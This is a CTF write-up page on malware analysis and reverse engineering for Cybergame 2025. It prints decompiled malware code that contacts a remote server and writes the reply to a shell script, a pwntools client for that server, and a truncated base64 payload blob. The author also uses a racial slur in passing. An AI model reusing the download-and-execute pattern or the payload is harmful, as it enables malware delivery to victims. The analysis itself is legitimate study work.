@@ -1,0 +1,907 @@
+<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=generator content="Qubt theme for Hugo"><title>Hacking Articles</title>
+<meta name=title content="Hacking Articles"><meta name=author content="Richie-Havoc"><meta name=description content="Expert ethical hacking tutorials, CTF writeups, and penetration testing guides. Learn cybersecurity through HackTheBox, TryHackMe walkthroughs."><meta name=google-adsense-account content="ca-pub-4834846196060641"><link type=text/css rel=stylesheet href=/css/main.bundle.min.c34ab593f7850b8e7984a77537a338f026bd2efcfe1715fbab66bda06475ab85.css integrity="sha256-w0q1k/eFC455hKd1N6M48Ca9Lvz+FxX7q2a9oGR1q4U="><script defer src=/js/main.bundle.min.5a00293bacd8510f50add105212cea76d541a955f6693035ef3128b638a21619.js integrity="sha256-WgApO6zYUQ9QrdEFISzqdtVBqVX2aTA17zEotjiiFhk="></script><link rel=apple-touch-icon sizes=180x180 href=/icon_hu74b16e164104d2d61e05b7604a924e01_486235_180x180_resize_box_3.png><link rel=icon type=image/png sizes=32x32 href=/icon_hu74b16e164104d2d61e05b7604a924e01_486235_32x32_resize_box_3.png><meta property="og:url" content="https://havocsec.me/ctf/writeup5/"><meta property="og:site_name" content="Hacking Articles"><meta property="og:title" content="CYBERGAME-2025 {MALWARE-ANALYSIS & REVERSE-ENG'}"><meta property="og:description" content=" Kenyan version organized by: Ministry of Information,Communications and the Digital Economy* "><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="ctf"><meta property="article:published_time" content="2025-06-11T00:00:00+00:00"><meta property="article:modified_time" content="2025-12-03T14:00:30+03:00"><meta property="og:image" content="https://havocsec.me/thumbnail.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://havocsec.me/thumbnail.png"><meta name=twitter:title content="CYBERGAME-2025 {MALWARE-ANALYSIS & REVERSE-ENG'}"><meta name=twitter:description content=" Kenyan version organized by: Ministry of Information,Communications and the Digital Economy* "><meta name=description content="Expert ethical hacking tutorials, CTF writeups, and penetration testing guides. Learn cybersecurity through HackTheBox, TryHackMe walkthroughs."><meta name=keywords content="hacking articles,hacking articles blog,hacking articles tutorials,hacking articles writeups,ethical hacking articles,cybersecurity articles,security hacking articles,penetration testing articles,infosec articles,cyber security hacking articles,cybersecurity,ethical hacking,CTF writeups,penetration testing,security research,bug bounty,offensive security,infosec,hackthebox,web exploitation,havoc,Richie havoc,htb,learn ethical hacking,hacking tutorials for beginners,cybersecurity tutorials,how to hack ethically,penetration testing course,security researcher blog,hacking step by step guide,ethical hacking examples,real world hacking scenarios,practical hacking exercises,Hercules,Soulmate,Darkcorp,Darkzero,Writeup,Bugbounty,htb writeups,hackthebox walkthrough,hackthebox solutions,penetration testing tutorials,linux privilege escalation,windows privilege escalation,active directory hacking,OSCP preparation,cyber security blog,vulnerability research,exploit development,reverse engineering,binary exploitation,pwn challenges,web security,network security,cryptography challenges,tryhackme,offsec labs,BoardLight HTB,Instant HTB,Sea HTB,Cicada HTB,Intuition HTB,Sightless HTB,Editorial HTB,Runner HTB,Greenhorn HTB,Blazorized HTB,Surveillance HTB,Headless HTB,Crafty HTB,Bizness HTB,Mist HTB,Usage HTB,Perfection HTB,Builder HTB,WifineticTwo HTB,Cap HTB,Analysis HTB,Keeper HTB,ctf challenges,capture the flag,cyber defense,red team operations,blue team defense,malware analysis,forensics challenges,steganography,OSINT techniques,kali linux tutorials,metasploit framework,burp suite tutorials,nmap scanning,sql injection,xss exploitation,privilege escalation techniques,buffer overflow,rop chain,shellcode development,reverse shell,web shell,docker security,kubernetes pentesting,cloud security,aws security,azure pentesting,api security testing,jwt exploitation,owasp top 10,security certifications,CEH preparation,OSWE preparation,OSCE preparation,NanoCorp HTB,NanoCorp walkthrough,NanoCorp writeup,NanoCorp HTB writeup,HTB NanoCorp exploitation,HTB NanoCorp solution,HackTheBox NanoCorp,NTLM relay attacks,NTLM relay exploitation,responder NTLM relay,ntlmrelayx tutorial,windows active directory exploitation,windows privilege escalation techniques,windows enumeration techniques,SMB relay attacks,credential discovery techniques,hard difficulty HTB machines,advanced windows hacking,active directory pentesting guide,windows security assessment,windows post exploitation,domain controller exploitation,kerberos attacks,pass the hash,lateral movement techniques,bloodhound enumeration,impacket tools,windows pentesting,HTB hard machines 2025,HTB season 9 machines,advanced AD attacks,HTB NanoCorp writeup,HTB NanoCorp Machine writeup,nanocorp.htb,CVE-2025-24071,HTB NanoCorp exploitation,DCOM exploitation,Windows DCOM attacks,DACL Abuse,best hacking articles website,top cybersecurity writeup blogs,where to find CTF writeups,detailed penetration testing tutorials,comprehensive hacking guides,step by step hacking tutorials,beginner to advanced ethical hacking,free hacking learning resources,cybersecurity blog 2025,latest hacking techniques,modern exploitation methods,practical security research,how to solve CTF challenges,how to hack hackthebox machines,privilege escalation methods explained,web application security testing,how to find vulnerabilities,penetration testing methodology,OSCP exam preparation tips,HTB machine walkthrough,CTF challenge solutions,security assessment guide,metasploit tutorials,burp suite guides,nmap cheat sheet,gobuster usage,hydra brute force,sqlmap injection,netcat reverse shell,wireshark packet analysis,john the ripper tutorial,hashcat cracking guide,OSCP certification preparation,CEH study materials,bug bounty hunter tips,cybersecurity career guide,penetration tester roadmap,ethical hacker certification,security researcher career path,infosec job preparation,2025 hacking tutorials,latest CVE exploits,zero day vulnerabilities,current cybersecurity threats,modern web exploitation,cloud security testing,API security vulnerabilities,container security hacking,AI security research,machine learning vulnerabilities,alternative to ippsec,similar to hackingarticles,best ctf writeup sites,top penetration testing blogs,ethical hacking resources,cybersecurity learning platforms,hacking practice labs,hacking community,infosec community blog,cybersecurity forum,ethical hacking discord,CTF community,bug bounty community,security researchers network"><meta name=author content="Richie-Havoc"><link rel=canonical href=https://havocsec.me/ctf/writeup5/><meta name=google-site-verification content="5kNQmF94i_v9xe8c753YHZ660ypehgkIpd5I_5VOPL0"><meta name=msvalidate.01 content="FC9BD45C329063D600401FC9551479B8"><meta property="og:type" content="article"><meta property="og:url" content="https://havocsec.me/ctf/writeup5/"><meta property="og:title" content="CYBERGAME-2025 {MALWARE-ANALYSIS & REVERSE-ENG'}"><meta property="og:description" content="Expert ethical hacking tutorials, CTF writeups, and penetration testing guides. Learn cybersecurity through HackTheBox, TryHackMe walkthroughs."><meta property="og:image" content><meta property="og:site_name" content="Hacking Articles"><meta property="og:locale" content="en_US"><meta property="article:published_time" content="2025-06-11T00:00:00Z"><meta property="article:modified_time" content="2025-12-03T14:00:30+03:00"><meta property="article:author" content="Richie-Havoc"><meta name=twitter:card content="summary_large_image"><meta name=twitter:url content="https://havocsec.me/ctf/writeup5/"><meta name=twitter:title content="CYBERGAME-2025 {MALWARE-ANALYSIS & REVERSE-ENG'}"><meta name=twitter:description content="Expert ethical hacking tutorials, CTF writeups, and penetration testing guides. Learn cybersecurity through HackTheBox, TryHackMe walkthroughs."><meta name=twitter:image content><meta name=twitter:site content="@HavocRichie?t=smiK1Is6LAWykS9FlJg4eQ&amp;s=09"><meta name=twitter:creator content="@HavocRichie?t=smiK1Is6LAWykS9FlJg4eQ&amp;s=09"><meta name=robots content="index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1"><meta name=googlebot content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1"><meta name=bingbot content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1"><meta name=yandex content="index, follow"><meta name=baiduspider content="index, follow"><meta name=language content="English"><meta name=revisit-after content="7 days"><meta name=rating content="General"><meta name=tagline content="Advanced Ethical Hacking & Security Research Platform"><meta name=slogan content="Learn. Hack. Share. Repeat."><meta name=category content="Technology"><meta name=topic content="Cybersecurity, Ethical Hacking, Penetration Testing"><meta name=coverage content="Worldwide"><meta name=distribution content="Global"><meta name=target content="all"><meta name=audience content="Security Researchers, Ethical Hackers, CTF Players, Penetration Testers, Bug Bounty Hunters, Cybersecurity Students"><meta name=geo.region content="US"><meta name=geo.placename content="United States"><meta name=mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-status-bar-style content="black-translucent"><meta name=apple-mobile-web-app-title content="Hacking Articles"><meta name=article:section content="ctf"><meta name=article:subtitle content="⚡ always use sandboxed machines or secure machines when dealing with malw⚡"><meta name=article:summary content="* Kenyan version organized by: Ministry of Information,Communications and the Digital Economy*"><meta property="article:publisher" content="https://havocsec.me"><meta name=publisher content="Hacking Articles"><meta name=copyright content="© 2025 Hacking Articles. All rights reserved."><meta name=alexaVerifyID content><meta name=norton-safeweb-site-verification content><meta name=thumbnail content><meta itemprop=name content="CYBERGAME-2025 {MALWARE-ANALYSIS & REVERSE-ENG'}"><meta itemprop=description content="Expert ethical hacking tutorials, CTF writeups, and penetration testing guides. Learn cybersecurity through HackTheBox, TryHackMe walkthroughs."><meta itemprop=image content><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https:\/\/havocsec.me\/"},{"@type":"ListItem","position":2,"name":"Ctf","item":"https:\/\/havocsec.me\/ctf/"},{"@type":"ListItem","position":3,"name":"CYBERGAME-2025 {MALWARE-ANALYSIS \u0026 REVERSE-ENG\u0027}","item":"https:\/\/havocsec.me\/ctf\/writeup5\/"}]}</script><script async src="https://www.googletagmanager.com/gtag/js?id=G-M2657LXPFW"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-M2657LXPFW",{anonymize_ip:!0,send_page_view:!0})</script><script>localStorage.getItem("color-theme")==="dark"||!("color-theme"in localStorage)&&window.matchMedia("(prefers-color-scheme: dark)").matches?document.documentElement.classList.add("dark"):document.documentElement.classList.remove("dark")</script></head><body class="flex h-screen flex-col justify-between bg-neutral-100 dark:bg-neutral-800"><div><header class="sticky top-0 z-10 bg-neutral-100 dark:bg-neutral-800"><section class="mx-auto flex max-w-(--breakpoint-xl) items-center justify-between p-4"><a href=https://havocsec.me/ class="flex items-center space-x-3"><img src=/logo_hu74b16e164104d2d61e05b7604a924e01_486235_filter_7015326143714700434.webp class="h-8 w-8" alt=Logo>
+<span class="self-center whitespace-nowrap text-2xl font-semibold text-slate-700 dark:text-slate-400">Hacking Articles</span></a><div class="flex flex-row space-x-8"><nav class="hidden space-x-8 text-xl md:block" aria-label=main><a href=/ class="px-3 py-2 text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Home
+</a><a href=/about/ class="px-3 py-2 text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Whoami
+</a><a href=/blog/ class="px-3 py-2 text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Blog
+</a><a href=/ctf/ class="px-3 py-2 text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">CTF
+</a><a href=/pentesting/ class="px-3 py-2 text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Pentesting
+</a><a href=/chitchat/ class="px-3 py-2 text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Chitchat</a></nav><button id=theme-toggle type=button class="rounded-lg text-sm text-slate-700 hover:text-indigo-500 dark:text-slate-400" aria-label=theme-switcher>
+<svg id="theme-toggle-dark-icon" class="hidden h-6 w-6" fill="currentcolor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M17.293 13.293A8 8 0 016.707 2.707a8.001 8.001.0 1010.586 10.586z"/></svg>
+<svg id="theme-toggle-light-icon" class="hidden h-6 w-6" fill="currentcolor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M10 2a1 1 0 011 1v1A1 1 0 119 4V3a1 1 0 011-1zm4 8a4 4 0 11-8 0 4 4 0 018 0zm-.464 4.95.707.707a1 1 0 001.414-1.414l-.707-.707a1 1 0 00-1.414 1.414zm2.12-10.607a1 1 0 010 1.414l-.706.707A1 1 0 1113.536 5.05l.707-.707a1 1 0 011.414.0zM17 11a1 1 0 100-2h-1a1 1 0 100 2h1zm-7 4a1 1 0 011 1v1a1 1 0 11-2 0v-1a1 1 0 011-1zM5.05 6.464A1 1 0 106.465 5.05l-.708-.707A1 1 0 004.343 5.757l.707.707zm1.414 8.486-.707.707a1 1 0 01-1.414-1.414l.707-.707a1 1 0 011.414 1.414zM4 11a1 1 0 100-2H3a1 1 0 000 2h1z" fill-rule="evenodd" clip-rule="evenodd"/></svg>
+</button>
+<button id=hamburger-button class="relative h-8 w-8 cursor-pointer text-3xl md:hidden" aria-label=hamburger-button><div class="absolute top-4 -mt-0.5 h-[3px] w-8 rounded-sm bg-slate-700 transition-all duration-500 before:absolute before:h-[3px] before:w-8 before:-translate-x-4 before:-translate-y-2.5 before:rounded-sm before:bg-slate-700 before:transition-all before:duration-500 before:content-[''] after:absolute after:h-[3px] after:w-8 after:-translate-x-4 after:translate-y-2.5 after:rounded-sm after:bg-slate-700 after:transition-all after:duration-500 after:content-[''] dark:bg-slate-400 dark:before:bg-slate-400 dark:after:bg-slate-400"></div></button></div></section><section id=mobile-menu class="absolute hidden w-full origin-top animate-open-menu flex-col justify-center bg-neutral-100 text-4xl dark:bg-neutral-800"><nav class="flex min-h-screen flex-col items-center py-8" aria-label=mobile><a href=/ class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Home
+</a><a href=/about/ class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Whoami
+</a><a href=/blog/ class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Blog
+</a><a href=/ctf/ class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">CTF
+</a><a href=/pentesting/ class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Pentesting
+</a><a href=/chitchat/ class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Chitchat</a></nav></section></header><main><div class="justify-left mx-auto mt-8 flex max-w-(--breakpoint-md) px-4"><article><h1 class="text-4xl font-extrabold text-slate-700 dark:text-slate-200">CYBERGAME-2025 {MALWARE-ANALYSIS & REVERSE-ENG'}
+     </h1><h2 class="mt-4 text-2xl text-slate-500 dark:text-slate-400">⚡ always use sandboxed machines or secure machines when dealing with malw⚡</h2><div class="mb-4 mt-2 text-sm text-slate-500 dark:text-slate-400">Jun 11, 2025 - 10 minute read</div><div class="flex flex-col"><img class="mt-4 h-full w-full object-cover" src=/cybergame_huafc7507f212e0984589b262f3614c387_367116_filter_11492400015018413633.webp alt="feature image" height=340 width=736>
+<span class="mb-4 mt-1 text-center text-sm text-slate-700 dark:text-slate-200">cybergame</span></div><span class="prose prose-slate break-words text-lg text-slate-700 dark:prose-invert prose-pre:max-w-[90vw] dark:text-slate-200 md:prose-pre:max-w-(--breakpoint-md) prose-code:before:hidden prose-code:after:hidden"><h3 id=tool>Tool</h3><p><img src="https://github.com/Daniel-wambua/blogz/blob/main/content/CTF/writeup5/images/connection%20checker%20tool.png?raw=true" alt=checker></p><p>Solution</p><p>I used <a href=https://www.decompiler.com/>Decompiler.com</a>, and decompliled the jar file and out of the blue Found this in the decompiled <code>.jar</code>:</p><pre tabindex=0><code>echo &#39;U0stQ0VSVHtqNHJfZDNjMG1wX2s3fQ==&#39; | base 64 -d 
+SK-CERT{j4r_d3c0mp_k7}
+</code></pre><h2 id=lies>Lies</h2><p><img src="https://github.com/Daniel-wambua/blogz/blob/main/content/CTF/writeup5/images/connectionchecker%20lies.png?raw=true" alt=checker></p><p><strong>Solution</strong></p><p>I extracted this part of the code from the decompiled <code>.jar</code> into a <code>Scratch</code> class to run, so I would not have to re-implement the decoding in something else:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Scratch</span> {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> var13 <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span>{<span style=color:#f92672>-</span>67, <span style=color:#f92672>-</span>33, 90, 3, <span style=color:#f92672>-</span>3, <span style=color:#f92672>-</span>61, <span style=color:#f92672>-</span>71, 35, 109, 78, 37, <span style=color:#f92672>-</span>109, 113, 90, 65, <span style=color:#f92672>-</span>109, <span style=color:#f92672>-</span>99, 66, 90, 66, 65, 83, 66, 79, 53};
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> s <span style=color:#f92672>=</span> var13;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>int</span> m <span style=color:#f92672>=</span> 0;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span>(<span style=color:#66d9ef>int</span> var14 <span style=color:#f92672>=</span> var13.<span style=color:#a6e22e>length</span>; m <span style=color:#f92672>&lt;</span> var14; <span style=color:#f92672>++</span>m) {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>int</span> c <span style=color:#f92672>=</span> s<span style=color:#f92672>[</span>m<span style=color:#f92672>]</span> <span style=color:#f92672>&amp;</span> 255;
+</span></span><span style=display:flex><span>            c <span style=color:#f92672>^=</span> m;
+</span></span><span style=display:flex><span>            c <span style=color:#f92672>=</span> c <span style=color:#f92672>-</span> 10 <span style=color:#f92672>&amp;</span> 255;
+</span></span><span style=display:flex><span>            c <span style=color:#f92672>=</span> <span style=color:#f92672>-</span>c <span style=color:#f92672>&amp;</span> 255;
+</span></span><span style=display:flex><span>            c <span style=color:#f92672>=</span> c <span style=color:#f92672>+</span> m <span style=color:#f92672>&amp;</span> 255;
+</span></span><span style=display:flex><span>            c <span style=color:#f92672>=</span> (c <span style=color:#f92672>&gt;&gt;</span> 2 <span style=color:#f92672>|</span> c <span style=color:#f92672>&lt;&lt;</span> 6) <span style=color:#f92672>&amp;</span> 255;
+</span></span><span style=display:flex><span>            s<span style=color:#f92672>[</span>m<span style=color:#f92672>]</span> <span style=color:#f92672>=</span> (<span style=color:#66d9ef>byte</span>)c;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(<span style=color:#66d9ef>new</span> String(s));
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>and found this easy peasy</p><pre tabindex=0><code>SK-CERT{k3y_f0r_c253rv3r}
+</code></pre><h2 id=executer>Executer</h2><p><img src="https://github.com/Daniel-wambua/blogz/blob/main/content/CTF/writeup5/images/connection%20checker%20executor.png?raw=true" alt=checker>
+<strong>Solution</strong></p><p>Asked my nigga Chart-gpt to give me this code and <strong>BOOM</strong> the code.Receive the payload from server using this python code,</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python3</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;&#34;&#34;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>String serverIp = &#34;195.168.112.4&#34;;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>int serverPort = 7051;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>...
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>if (Intrinsics.areEqual(hash, &#34;de2ca7388ab6efb59a977505b9414ca2&#34;)) {
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>try {
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>   Socket socket = new Socket(serverIp, serverPort);
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>   PrintWriter output = new PrintWriter(socket.getOutputStream(), true);
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>   BufferedReader input = new BufferedReader((Reader)(new InputStreamReader(socket.getInputStream())));
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>   byte[] var13 = new byte[]{-67, -33, 90, 3, -3, -61, -71, 35, 109, 78, 37, -109, 113, 90, 65, -109, -99, 66, 90, 66, 65, 83, 66, 79, 53};
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>   byte[] s = var13;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>   int m = 0;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>   for(int var14 = var13.length; m &lt; var14; ++m) {
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>      int c = s[m] &amp; 255;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>      c ^= m;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>      c = c - 10 &amp; 255;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>      c = -c &amp; 255;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>      c = c + m &amp; 255;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>      c = (c &gt;&gt; 2 | c &lt;&lt; 6) &amp; 255;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>      s[m] = (byte)c;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>   }
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>   String encodedData = base64(hash + &#39;|&#39; + new String(s, Charsets.UTF_8));
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>   output.println(encodedData);
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>   String response = input.readLine();
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>   if (response == null) {
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>      System.exit(0);
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>      throw new RuntimeException(&#34;System.exit returned normally, while it was supposed to halt JVM.&#34;);
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>   }
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>   File tmpFile = File.createTempFile(&#34;tempScript&#34;, &#34;.sh&#34;);
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> base64
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Set the server and port</span>
+</span></span><span style=display:flex><span>HOST <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;195.168.112.4&#39;</span>
+</span></span><span style=display:flex><span>PORT <span style=color:#f92672>=</span> <span style=color:#ae81ff>7051</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Original payload (change this as needed)</span>
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;de2ca7388ab6efb59a977505b9414ca2|SK-CERT</span><span style=color:#e6db74>{k3y_f0r_c253rv3r}</span><span style=color:#e6db74>&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Encode payload in Base64</span>
+</span></span><span style=display:flex><span>encoded_payload <span style=color:#f92672>=</span> base64<span style=color:#f92672>.</span>b64encode(payload)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>print(encoded_payload)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Connect to the server</span>
+</span></span><span style=display:flex><span>conn <span style=color:#f92672>=</span> remote(HOST, PORT)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Send the Base64-encoded payload</span>
+</span></span><span style=display:flex><span>conn<span style=color:#f92672>.</span>sendline(encoded_payload)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Read and print the response</span>
+</span></span><span style=display:flex><span>response <span style=color:#f92672>=</span> conn<span style=color:#f92672>.</span>recvline()
+</span></span><span style=display:flex><span>print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Raw response: </span><span style=color:#e6db74>{</span>response<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Optionally decode the response if it&#39;s base64 as well</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>try</span>:
+</span></span><span style=display:flex><span>    decoded <span style=color:#f92672>=</span> base64<span style=color:#f92672>.</span>b64decode(response<span style=color:#f92672>.</span>strip())
+</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Decoded response: </span><span style=color:#e6db74>{</span>decoded<span style=color:#f92672>.</span>decode(errors<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;ignore&#39;</span>)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
+</span></span><span style=display:flex><span><span style=color:#66d9ef>except</span> <span style=color:#a6e22e>Exception</span> <span style=color:#66d9ef>as</span> e:
+</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Could not decode response: </span><span style=color:#e6db74>{</span>e<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Close the connection</span>
+</span></span><span style=display:flex><span>conn<span style=color:#f92672>.</span>close()
+</span></span></code></pre></div><p>then use Binary Refinery to turn it into a <code>.pyc</code> module:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>r.emit <span style=color:#e6db74>&#39;pw0NCgAAAAD9WulnIAMAAOMAAAAAAAAAAAAAAAADAAAAAAAAAPNOAAAAlwBkAGQBbABaAGQAZAFsAVoBZABkAWwCWgJkAoQAWgNlBGQDawIAAAAAcg9kBFoFAgBlA2UFpgEAAKsBAAAAAAAAAAABAGQBUwBkAVMAKQXpAAAAAE5jAQAAAAAAAAAAAAAADQAAAAMAAADzbgIAAJcAdAEAAAAAAAAAAAAAagEAAAAAAAAAAHwApgEAAKsBAAAAAAAAAABEAJABXR5cAwAAfQF9An0DfANEAJABXRN9BHwEoAIAAAAAAAAAAAAAAAAAAAAAAAAAAKYAAACrAAAAAAAAAAAAoAMAAAAAAAAAAAAAAAAAAAAAAAAAAGQBpgEAAKsBAAAAAAAAAABy6XQAAAAAAAAAAAAAAGoEAAAAAAAAAACgBQAAAAAAAAAAAAAAAAAAAAAAAAAAfAF8BKYCAACrAgAAAAAAAAAAfQUJAHQNAAAAAAAAAAAAAHwFZAKmAgAAqwIAAAAAAAAAADUAfQZkA3wEfAZmAmkBfQZ0DwAAAAAAAAAAAABkBKAFAAAAAAAAAAAAAAAAAAAAAAAAAABkBYQAdBEAAAAAAAAAAAAAdBMAAAAAAAAAAAAAZAamAQAAqwEAAAAAAAAAAKAKAAAAAAAAAAAAAAAAAAAAAAAAAABkB6YBAACrAQAAAAAAAAAApgEAAKsBAAAAAAAAAABEAKYAAACrAAAAAAAAAAAApgEAAKsBAAAAAAAAAAB0FwAAAAAAAAAAAACmAAAAqwAAAAAAAAAAAKYCAACrAgAAAAAAAAAAAQB0GQAAAAAAAAAAAABqDQAAAAAAAAAAdBwAAAAAAAAAAAAAfAasCKYCAACrAgAAAAAAAAAAfQdkAGQAZACmAgAAqwIAAAAAAAAAAAEAbgsjADEAcwR3AngDWQB3AQEAWQABAAEAjPsjAHQeAAAAAAAAAAAAACQAcgt9CFkAZAB9CH4IkAGMC2QAfQh+CHcBdwB4A1kAdwGQAYwVkAGMIGQAUwApCU56BC5kb2PaAnJi2gRmaWxl2gBjAQAAAAAAAAAAAAAACwAAADMAAADzhgAAAEsAAQCXAHwAXTxcAgAAfQF9AnQBAAAAAAAAAAAAAHwCdAMAAAAAAAAAAAAAZAB8AXQFAAAAAAAAAAAAAGQApgEAAKsBAAAAAAAAAAB6BgAAGQAAAAAAAAAAAKYBAACrAQAAAAAAAAAAegwAAKYBAACrAQAAAAAAAAAAVgCXAQEAjD1kAVMAKQLaEFVJR2lvZXB4aFdud0dJT0tOKQPaA2NoctoDb3Jk2gNsZW4pA9oCLjDaAWnaAWJzAwAAACAgIPoKcGF5bG9hZC5wefoJPGdlbmV4cHI+ehRzLjxsb2NhbHM+LjxnZW5leHByPg0AAABzagAAAOgA6ACAAPAAACVyA/AAACVyA9Fna9BnaNBqa6VTqBGtU9AxQ8BBzQPQTF7RSF/USF/RRF/UMWDRLWHULWHRKWHRJWLUJWLwAAAlcgPwAAAlcgPwAAAlcgPwAAAlcgPwAAAlcgPwAAAlcgPzAAAAANoGYmFzZTY0elRJR2w2U1UwTkJBd1liVUZZSmowN0tqWWlJaHRCQkJRY0dqSWRCR2dsS2lvK0ZpRUFBd0JUS3lONkxUSVZIVFE3TEg0dldRRTZBRXdSTzE1REl6UnQpAdoFZmlsZXMpENoCb3PaBHdhbGvaBWxvd2Vy2ghlbmRzd2l0aNoEcGF0aNoEam9p